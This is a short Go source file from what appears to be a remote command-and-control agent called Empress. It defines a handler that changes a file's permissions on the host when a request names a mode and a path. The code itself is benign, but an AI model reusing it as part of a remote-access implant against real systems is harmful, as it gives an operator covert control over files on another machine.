package fs

import (
	"errors"
	"github.com/pygrum/Empress/transport"
	"os"
	"strconv"
)

func CmdChmod(req *transport.Request, response *transport.Response) {
	mode, err := strconv.Atoi(string(req.Args[0]))
	if err != nil {
		transport.ResponseWithError(response, errors.New("invalid file mode"))
		return
	}
	file := string(req.Args[1])
	if err = os.Chmod(file, os.FileMode(mode)); err != nil {
		transport.ResponseWithError(response, err)
		return
	}
	transport.AddResponse(response, transport.ResponseDetail{
		Status: transport.StatusSuccess,
		Dest:   transport.DestNone,
	})
}
